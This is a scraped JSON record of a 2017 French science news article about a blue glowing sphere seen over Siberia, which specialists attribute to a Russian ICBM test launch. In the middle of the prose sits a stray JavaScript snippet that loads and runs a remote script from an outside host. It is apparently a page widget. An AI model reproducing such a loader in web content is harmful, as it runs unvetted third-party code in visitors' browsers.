{"title": "Une etrange bulle bleue dans le ciel de Siberie", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-10-30", "content": "Dans la nuit du 26 octobre, en Siberie, plusieurs personnes ont pu voir une sphere lumineuse bleutee grandir dans le ciel, a cote des aurores boreales qui dansaient a ce moment-la. S'agissait-il d'un phenomene naturel ou artificiel ? Un etrange phenomene celeste a ete observe dans la nuit du 26 octobre, en Siberie et meme jusqu'en Suede. Grand habitue des  aurores boreales , le guide Oliver  Wright , qui etait alors a Abisko, en Suede, raconte qu'il n'avait jamais vu cela auparavant :  << Le ciel etait totalement bleu >> . Il y avait bien des  aurores  ce soir-la, qui dansaient a cote, comme cela arrive souvent, mais une aurore d'un bleu glacial comme celle-ci, c'est vraiment tres rare... Surtout que le 26 octobre dernier, l'activite geomagnetique etait relativement calme et faible. Autrement dit, cette lueur bleue ne pouvait pas etre causee par une intense  tempete  solaire -- les  aurores bleues  se produisent lorsque des particules tres energetiques interagissent avec l' azote  moleculaire ionise a tres haute altitude. Sur cette video amateur, on peut voir le phenomene evoluer. (c)  The Siberian Times Un phenomene d'origine naturelle ou artificielle ? C'est en Siberie que le phenomene paraissait le plus etrange. De nombreuses personnes virent et photographierent dans le ciel une bulle bleue qui s'etendait.  << J'etais sorti fumer une cigarette et j'ai alors pense que c'etait la fin du monde >> , raconte un internaute sur VK, le Facebook russe.  << Je fus abasourdi pendant quelques minutes, ne comprenant pas ce qu'il se passait >> , a confie a  The Siberian Times  le photographe Sergey Anisimov. S'agissait-il de l'arrivee d' extraterrestres  ? de l'ouverture d'une  porte spatio-temporelle  ? Comme on peut s'en douter, les speculations sur la nature du phenomene sont allees bon train sur les  reseaux sociaux . Alors, ce phenomene etait-il d'origine naturelle ou artificielle ?  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : D'ou viennent ces etranges piliers lumineux vus dans le ciel du Canada ? La meilleure explication pour l'instant reste la piste militaire. Ce jeudi 26 octobre, en effet, le president russe Vladimir Poutine assistait a un exercice de combat nucleaire et proceda lui-meme au lancement de quatre  missiles  balistiques a travers la Siberie, de Plessetsk au Kamtchatka. Il est donc possible que cette lueur bleutee ait ete provoquee par le tir d'un Topol ICBM, suggerent des specialistes. Ce ne serait pas la premiere fois qu'un engin terrestre s'envolant dans la nuit cree une  atmosphere  aussi etrange. De superbes aurores boreales vues depuis l'espace                       Voici de magnifiques aurores boreales photographiees de l'espace le 15 septembre 2017 par Paolo Nespoli. L'astronaute de l'ESA est arrive a bord de la Station spatiale internationale fin juillet 2017. Durant quatre mois, il mene une mission baptisee Vita.                                       ", "theme": "sciences"}